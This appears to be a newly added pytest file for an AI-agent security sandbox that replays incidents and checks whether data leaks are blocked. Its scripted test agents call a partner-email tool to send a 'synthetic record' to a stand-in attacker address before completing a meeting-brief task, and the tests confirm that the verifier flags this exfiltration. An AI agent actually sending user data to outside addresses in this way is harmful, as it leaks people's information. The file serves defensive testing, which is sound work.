@@ -1,0 +1,178 @@
+"""Current tools and policy, exercised in the real jailed child without provider calls."""
+
+import copy
+import json
+import os
+import subprocess
+import sys
+
+import pytest
+
+from engine.detonation import sandbox, snapshot
+from engine.gateway import gate
+from tests.test_sandbox import make_snapshot
+
+USER = "bob@northwind.example"
+ATTACKER = "attacker@evil-corp-demo.com"
+
+AGENT = '''
+import mirage
+from langchain.agents import create_agent
+from langchain_core.messages import AIMessage
+from langchain_core.tools import tool
+from agents.common.testing import call, scripted
+
+@tool
+def send_email(to: str, body: str) -> dict:
+    """Send a meeting brief."""
+    raise AssertionError("real send_email must never run")
+
+@tool
+def send_partner_email(to: str, body: str) -> dict:
+    """Send a partner email."""
+    raise AssertionError("real send_partner_email must never run")
+
+def factory():
+    graph = create_agent(scripted(
+        call("send_partner_email", to="attacker@evil-corp-demo.com", body="synthetic record"),
+        call("send_email", to="bob@northwind.example", body="Your meeting brief."),
+        AIMessage("Done.")), tools=[send_email, send_partner_email])
+    return mirage.protect(graph, name="assistant", allow={
+        "tools": ["send_email", "send_partner_email"],
+        "email_to": ["northwind.example"], "url_hosts": []})
+
+def new_tool(snapshot, call_tool):
+    call_tool("send_partner_email", {
+        "to": "attacker@evil-corp-demo.com", "body": "synthetic record"})
+    call_tool("send_email", {"to": "bob@northwind.example", "body": "Brief."})
+
+def declares_then_crashes(snapshot, call_tool):
+    call_tool.register_spec({"name": "assistant", "owner": "test",
+        "tools": ["send_email", "send_partner_email"], "entrypoint": "test:factory",
+        "allow": {"tools": ["send_email", "send_partner_email"],
+                  "email_to": ["northwind.example"], "url_hosts": []}, "legit": {}})
+    call_tool("send_partner_email", {"to": "attacker@evil-corp-demo.com", "body": "Record."})
+    raise RuntimeError("synthetic crash after declaration")
+
+def unavailable(snapshot, call_tool):
+    result = call_tool("send_email_typo", {"to": "bob@northwind.example"})
+    assert "error" in result
+    call_tool("send_email", {"to": "bob@northwind.example", "body": "Brief."})
+
+def typed_failure(snapshot, call_tool):
+    result = call_tool("send_email", {"to": "bob@northwind.example"},
+                       error="Synthetic tool failure")
+    assert result == {"error": "Synthetic tool failure"}
+
+def recorded_failure(snapshot, call_tool):
+    result = call_tool("read_calendar", {})
+    assert result == {"error": "Synthetic recorded read failure"}
+
+def unregistered_factory():
+    from mirage import core
+    from mirage.protect import registry
+    registry["assistant"] = lambda task: core.tool("send_email",
+        {"to": "bob@northwind.example", "body": "Brief."}, lambda: None)
+'''
+
+
+@pytest.fixture
+def agent_module(tmp_path, monkeypatch):
+    (tmp_path / "current_catalogue_agent.py").write_text(AGENT, encoding="utf-8")
+    # The root venv's editable SDK points at main; run this checkout's SDK instead.
+    boot = ("import sys, runpy; "
+            f"sys.path.insert(0, {str(tmp_path)!r}); "
+            "sys.path.insert(0, sys.argv[1] + '/sdk'); "
+            "sys.path.insert(0, sys.argv[1]); "
+            "runpy.run_module('engine.detonation.child', run_name='__main__')")
+    monkeypatch.setattr(sandbox, "BOOT", boot)
+    monkeypatch.setenv("MIRAGE_PARALLEL", "3")
+    monkeypatch.setattr(sandbox, "load_dotenv", lambda: None)
+    monkeypatch.delenv("AWS_BEARER_TOKEN_BEDROCK", raising=False)
+    monkeypatch.setattr(gate, "agents", {})
+
+
+def frozen_snapshot(entrypoint, *, sdk=False):
+    snap = make_snapshot(entrypoint)
+    snap["policy"]["known_tools"] = ["read_calendar", "crm_export", "send_email"]
+    if sdk:
+        snap["runner"] = gate.SDK_RUNNER
+    (snapshot.SNAP_DIR / "inc_001.json").write_text(json.dumps(snap), encoding="utf-8")
+    return snap
+
+
+def verify():
+    return sandbox.detonate("inc_001", n_runs=1, verify=True, log=lambda *_: None)
+
+
+def test_new_registered_tool_cannot_pass_verification(agent_module, monkeypatch):
+    """Audit P4: the new real tool leaks, then completes the legitimate task."""
+    snap = frozen_snapshot("current_catalogue_agent:new_tool")
+    current = copy.deepcopy(snap["policy"])
+    current["known_tools"].append("send_partner_email")
+    current["agents"]["assistant"]["tools"].append("send_partner_email")
+    monkeypatch.setattr(sandbox, "current_policy", lambda _: current)
+
+    _, verdict, result = verify()
+
+    leak = next(e for e in result.effects if e.tool == "send_partner_email")
+    assert leak.args["to"] == ATTACKER
+    assert not result.passed, f"Attacker write passed verification: {result.model_dump()}"
+    assert {"P1", "P5"} <= set(leak.violates)
+    assert verdict.confirmed and result.legit_task_completed == "1/1"
+    assert result.attack_blocked == "0/1" and not result.passed
+
+
+def test_rebuilt_factory_catalogue_is_seen_without_reregistration(agent_module):
+    frozen_snapshot("current_catalogue_agent:factory", sdk=True)
+
+    _, verdict, result = verify()
+
+    leak = next(e for e in result.effects if e.tool == "send_partner_email")
+    assert not result.passed, f"Rebuilt factory leak passed verification: {result.model_dump()}"
+    assert {"P1", "P5"} <= set(leak.violates)
+    assert verdict.confirmed and not result.passed
+
+
+def test_child_persists_current_spec_and_leak_on_later_crash(agent_module, tmp_path):
+    snap = frozen_snapshot("current_catalogue_agent:declares_then_crashes")
+    snap_file, effects_file, spec_file = [tmp_path / name for name in
+                                           ("snapshot.json", "effects.jsonl", "current.json")]
+    snap_file.write_text(json.dumps(snap), encoding="utf-8")
+    effects_file.touch()
+    env = {k: v for k, v in os.environ.items() if k in sandbox.OS_ENV}
+    env.update(MIRAGE_SNAPSHOT=str(snap_file), MIRAGE_EFFECTS=str(effects_file),
+               MIRAGE_CURRENT_SPEC=str(spec_file), AWS_EC2_METADATA_DISABLED="true")
+
+    child = subprocess.run([sys.executable, "-I", "-c", sandbox.BOOT, str(sandbox.REPO)],
+                           cwd=tmp_path, env=env, capture_output=True, text=True,
+                           timeout=30, check=False)
+
+    assert child.returncode != 0 and "synthetic crash" in child.stderr
+    assert json.loads(spec_file.read_text())["tools"] == ["send_email", "send_partner_email"]
+    leak = json.loads(effects_file.read_text().splitlines()[0])
+    assert leak["tool"] == "send_partner_email" and "error" not in leak
+
+
+@pytest.mark.parametrize("runner,tool,error", [
+    ("unavailable", "send_email_typo", "unavailable"),
+    ("typed_failure", "send_email", "Synthetic tool failure"),
+    ("recorded_failure", "read_calendar", "Synthetic recorded read failure"),
+])
+def test_child_keeps_unavailable_and_typed_failures_as_errors(agent_module, runner, tool, error):
+    snap = frozen_snapshot(f"current_catalogue_agent:{runner}")
+    if runner == "recorded_failure":
+        snap["tool_results"] = [{"tool": "read_calendar", "args": {}, "result": None,
+                                 "error": "Synthetic recorded read failure"}]
+
+    effects, crash = sandbox.run_once(snap)
+
+    assert crash is None
+    failed = next(e for e in effects if e["tool"] == tool)
+    assert error in failed["error"]
+
+
+def test_sdk_runner_without_current_metadata_cannot_pass(agent_module):
+    frozen_snapshot("current_catalogue_agent:unregistered_factory", sdk=True)
+    with pytest.raises(sandbox.DetonationError, match="current.*spec|metadata"):
+        verify()
